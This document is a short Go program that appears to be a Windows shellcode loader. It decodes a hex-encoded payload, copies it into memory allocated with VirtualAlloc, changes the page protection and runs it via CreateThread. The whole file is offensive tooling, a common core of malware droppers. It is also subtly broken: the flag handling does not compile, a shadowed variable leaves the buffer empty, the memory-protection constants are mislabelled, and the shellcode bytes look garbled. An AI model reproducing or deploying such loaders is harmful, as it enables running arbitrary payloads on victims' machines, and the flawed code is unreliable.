package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT      = 0x1000
	MEM_RESERVE      = 0x2000
	PAGE_EXECUTE_READWRITE = 0x20
	PAGE_EXECUTE_READ    = 0x04
)

var (
	verbose bool
	debug  bool
	shellcode []byte
)

func main() {
	rand.Seed(time.Now().UnixNano())
	verbose = flag.Bool("verbose", false, "Enable verbose output")
	debug = flag.Bool("debug", false, "Enable debug output")
	flag.Parse()

	shellcode, err := hex.DecodeString("31c975085997525053b8001025c825c063c043c9b8190001eb8180001e8c723b75f85e84e83c2e8d7289665389e389d54f75ec89c299c3a9c189c541ebfeb83f0001e8f5243b83c0001eb4925c0515156e8e0001ebe8040001e8d124525a2585a5959c30f84d90000")
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]There was an error decoding the string to a hex byte array: %s", err.Error()))
	}
	shellcodeAllocation()
}

func shellcodeAllocation() {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	shellcodePtr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc: %s", err.Error()))
	}

	if shellcodePtr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	_, _, err = RtlCopyMemory.Call(shellcodePtr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory: %s", err.Error()))
	}

	_, _, err = VirtualProtect.Call(shellcodePtr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&shellcode[0])))
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualProtect: %s", err.Error()))
	}

	thread, _, err := CreateThread.Call(0, 0, shellcodePtr, uintptr(0), 0, 0)
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread: %s", err.Error()))
	}

	if thread == 0 {
		log.Fatal("[!]CreateThread failed and returned 0")
	}

	_, _, err = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject: %s", err.Error()))
	}
}